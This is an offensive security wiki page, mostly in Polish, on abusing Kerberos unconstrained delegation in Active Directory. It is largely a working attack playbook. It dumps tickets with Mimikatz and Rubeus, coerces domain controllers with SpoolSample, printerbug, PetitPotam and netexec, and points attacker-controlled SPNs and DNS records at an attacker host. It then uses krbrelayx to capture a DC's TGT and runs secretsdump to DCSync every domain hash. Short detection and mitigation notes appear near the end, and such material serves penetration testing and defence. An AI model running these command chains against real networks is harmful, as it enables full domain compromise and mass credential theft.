# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

To jest funkcja, którą Domain Administrator może ustawić dla dowolnego **Computer** w obrębie domeny. Następnie, za każdym razem gdy **user logins** do Computer, **kopiowana TGT** tego użytkownika zostanie **wysłana wewnątrz TGS** dostarczanego przez DC **i zapisana w pamięci w LSASS**. Więc jeśli masz uprawnienia Administratora na maszynie, będziesz mógł **dump the tickets i impersonate the users** na dowolnej maszynie.

Więc jeśli domain admin logins do Computer z aktywowaną funkcją "Unconstrained Delegation", a ty masz lokalne uprawnienia administratora na tej maszynie, będziesz mógł zrzucić ticket i impersonate Domain Admin wszędzie (domain privesc).

Możesz **find Computer objects with this attribute** sprawdzając, czy atrybut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) zawiera [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Możesz to zrobić za pomocą filtra LDAP ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, co właśnie robi powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Załaduj bilet Administratora (lub użytkownika ofiary) do pamięci za pomocą **Mimikatz** lub **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Więcej informacji: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Więcej informacji o Unconstrained delegation w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Jeśli atakujący jest w stanie **skompromitować komputer z dozwolonym "Unconstrained Delegation"**, może **oszukać** **Print server**, aby **automatycznie zalogował się** do niego, **zapisując TGT** w pamięci serwera.\
Następnie atakujący może wykonać atak **Pass the Ticket, aby impersonate** użytkownika konta komputera Print server.

Aby wymusić logowanie print server na dowolnej maszynie możesz użyć [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Jeśli TGT pochodzi z domain controller, możesz wykonać atak [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) i uzyskać wszystkie hashe z DC.\
[**Więcej informacji o tym ataku na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Znajdziesz tutaj inne sposoby na **wymuszenie uwierzytelnienia:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Każdy inny coercion primitive, który zmusza ofiarę do uwierzytelnienia się przy użyciu **Kerberos** do twojego hosta z unconstrained-delegation, też działa. W nowoczesnych środowiskach często oznacza to zastąpienie klasycznego flow PrinterBug przez **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** lub coercion oparty na **WebClient/WebDAV**, w zależności od tego, jaka powierzchnia RPC jest osiągalna.

### Abuse użytkownika/konta service z unconstrained delegation

Unconstrained delegation nie jest **ograniczone do obiektów computer**. **User/service account** może być również skonfigurowane jako `TRUSTED_FOR_DELEGATION`. W takim scenariuszu praktyczny wymóg jest taki, że konto musi otrzymywać Kerberos service tickets dla **SPN, który należy do niego**.

Prowadzi to do 2 bardzo częstych ofensywnych ścieżek:

1. Kompromitujesz password/hash konta **user account** z unconstrained-delegation, a następnie **dodajesz SPN** do tego samego konta.
2. Konto już ma jeden lub więcej SPN, ale jeden z nich wskazuje na **stary/wycofany hostname**; odtworzenie brakującego **DNS A record** wystarcza, aby przejąć flow uwierzytelniania bez modyfikowania zestawu SPN.

Minimalny flow Linux:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Uwagi:

- Jest to szczególnie przydatne, gdy unconstrained principal jest **service account** i masz tylko jego credentials, a nie code execution na dołączonym hoście.
- Jeśli docelowy user ma już **stale SPN**, odtworzenie odpowiedniego **DNS record** może być mniej noisy niż zapisanie nowego SPN do AD.
- Ostatnie Linux-centric tradecraft używa `addspn.py`, `dnstool.py`, `krbrelayx.py` oraz jednego coercion primitive; nie musisz dotykać hosta Windows, aby dokończyć chain.

### Abusing Unconstrained Delegation z computer utworzonym przez attacker

Nowoczesne domeny często mają `MachineAccountQuota > 0` (domyślnie 10), co pozwala każdemu authenticated principal utworzyć do N computer objects. Jeśli dodatkowo masz privilege tokena `SeEnableDelegationPrivilege` (lub równoważne rights), możesz ustawić nowo utworzony computer jako trusted for unconstrained delegation i harvest inbound TGTs z privileged systems.

Wysokopoziomowy flow:

1) Utwórz computer, nad którym masz kontrolę
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Uczyń fałszywy hostname rozwiązywalnym wewnątrz domeny
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Włącz Unconstrained Delegation na komputerze kontrolowanym przez atakującego
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Dlaczego to działa: przy unconstrained delegation LSA na komputerze z włączoną delegacją buforuje przychodzące TGT. Jeśli nakłonisz DC lub uprzywilejowany serwer do uwierzytelnienia się na twoim fałszywym hoście, jego machine TGT zostanie zapisany i będzie można go wyeksportować.

4) Uruchom krbrelayx w trybie export i przygotuj materiał Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Wymuś uwierzytelnienie z DC/serwerów do twojego fałszywego hosta
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx zapisze pliki ccache, gdy maszyna się uwierzytelni, na przykład:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Użyj przechwyconego TGT maszyny DC, aby wykonać DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notes and requirements:

- `MachineAccountQuota > 0` enables unprivileged computer creation; otherwise you need explicit rights.
- Setting `TRUSTED_FOR_DELEGATION` on a computer requires `SeEnableDelegationPrivilege` (or domain admin).
- Ensure name resolution to your fake host (DNS A record) so the DC can reach it by FQDN.
- Coercion requires a viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Disable these on DCs if possible.
- If the victim account is marked as **"Account is sensitive and cannot be delegated"** or is a member of **Protected Users**, the forwarded TGT will not be included in the service ticket, so this chain won't yield a reusable TGT.
- If **Credential Guard** is enabled on the authenticating client/server, Windows blocks **Kerberos unconstrained delegation**, which can make otherwise valid coercion paths fail from an operator perspective.

Detection and hardening ideas:

- Alert on Event ID 4741 (computer account created) and 4742/4738 (computer/user account changed) when UAC `TRUSTED_FOR_DELEGATION` is set.
- Monitor for unusual DNS A-record additions in the domain zone.
- Watch for spikes in 4768/4769 from unexpected hosts and DC-authentications to non-DC hosts.
- Restrict `SeEnableDelegationPrivilege` to a minimal set, set `MachineAccountQuota=0` where feasible, and disable Print Spooler on DCs. Enforce LDAP signing and channel binding.

### Mitigation

- Limit DA/Admin logins to specific services
- Set "Account is sensitive and cannot be delegated" for privileged accounts.

## References

- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html
- harmj0y – S4U2Pwnage: https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
- ired.team – Domain compromise via unrestricted delegation: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- krbrelayx: https://github.com/dirkjanm/krbrelayx
- Impacket addcomputer.py: https://github.com/fortra/impacket
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- netexec (CME fork): https://github.com/Pennyw0rth/NetExec
- Praetorian – Unconstrained Delegation in Active Directory: https://www.praetorian.com/blog/unconstrained-delegation-active-directory/
- Microsoft Learn – Protected Users Security Group: https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

{{#include ../../banners/hacktricks-training.md}}
